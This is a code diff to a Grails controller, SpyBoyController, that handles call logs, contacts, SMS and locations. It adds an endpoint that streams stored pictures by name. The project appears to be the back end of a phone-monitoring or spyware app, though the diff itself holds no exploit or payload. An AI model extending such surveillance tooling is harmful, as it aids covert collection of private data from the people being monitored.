@@ -4,6 +4,7 @@ import grails.converters.JSON;
 
 import com.xaviar.domain.CallLog
 import com.xaviar.domain.Contact
+import com.xaviar.domain.FileData;
 import com.xaviar.domain.Location
 import com.xaviar.domain.Sms
 
@@ -106,4 +107,22 @@ class SpyBoyController {
 		List locations = Location.list(sort:"time");
 		[locationInstanceList:locations as JSON,locationInstanceTotal: Location.count()];
 	}
+	
+	
+	def getImageBytes() {
+		println (params.picname);
+		FileData pic = FileData.findByNameLike("%" + params.picname +"%");
+		if(pic!=null){
+			response.getOutputStream().write(pic.decodedPic);
+			response.getOutputStream().flush();
+		}else{
+			def baseFolder = grailsAttributes.getApplicationContext().getResource("/").getFile().toString()
+			def imagesFolder = baseFolder + '/images/'			
+			println (imagesFolder);
+			File file = new File(imagesFolder+"happy-clients-01.jpg");
+			response.contentType = "image/jpeg";
+			response.getOutputStream().write(file.bytes);
+			response.outputStream.flush();		
+		}
+	}	
 }
